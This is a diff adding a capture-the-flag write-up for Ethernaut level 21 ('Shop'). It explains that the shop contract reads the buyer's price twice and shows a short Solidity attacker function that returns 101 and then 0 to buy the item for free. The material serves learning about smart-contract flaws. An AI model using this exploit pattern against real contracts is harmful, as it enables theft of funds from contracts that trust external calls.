@@ -517,6 +517,32 @@ receive() external payable {
 
 ## 21 - Shop
 
+The goal here is to buy an item for less than 100.
+
+Because of the way the contact is written:
+
+```solidity
+if (_buyer.price() >= price && !isSold) {
+    isSold = true;
+    price = _buyer.price();
+}
+```
+
+It is possible to write a contract that the first time, it return one value, and the second time it is called it returns another:
+
+```solidity
+function price() public payable returns (uint256) {
+    if (shop.isSold() == false) {
+        return 101;
+    }
+    return 0;
+}
+```
+
+This way we trick the original contract.
+
+[Script](./scripts/21-Shop.ts) | [Test](./test/21-Shop.spec.ts)
+
 ## 22 - DEX
 
 ## 23 - DEX TWO
